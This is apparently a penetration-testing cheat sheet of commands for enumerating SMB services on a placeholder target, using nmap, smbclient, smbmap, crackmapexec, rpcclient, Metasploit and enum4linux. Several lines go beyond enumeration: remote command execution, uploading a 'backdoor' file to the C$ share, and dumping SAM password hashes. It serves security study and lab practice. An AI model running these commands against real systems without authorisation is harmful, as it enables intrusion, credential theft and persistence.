# ENUM — SMB (139/445)

## Nmap
```bash
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>
nmap -p 445 --script smb-os-discovery <TARGET_IP>
nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmblookup -A <TARGET_IP>
```

## SMBClient / SMBMap
```bash
smbclient -L //<TARGET_IP> -N
smbclient -L //<TARGET_IP> -U '<USER>'
smbclient //<TARGET_IP>/<SHARE> -U '<USER>'

smbmap -u guest -p "" -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/backdoor' 'C$\backdoor'
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
```

## CrackMapExec / RPCClient
```bash
crackmapexec smb <TARGET_IP> -u <USER> -p <PW>
crackmapexec smb <TARGET_IP> -u <USER> -p <PW> --users
crackmapexec smb <TARGET_IP> -u <USER> -p <PW> -x ipconfig
crackmapexec smb <TARGET_IP> -u <USER> -p <PW> --sam

rpcclient -U "" -N <TARGET_IP>
# srvinfo | querydispinfo | enumdomusers | enumdomgroups | lookupnames admin

use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/smb_version
```

## Enum4Linux
```bash
/usr/share/enum4linux/enum4linux.pl -a <TARGET_IP> | tee enum4linux.log
```
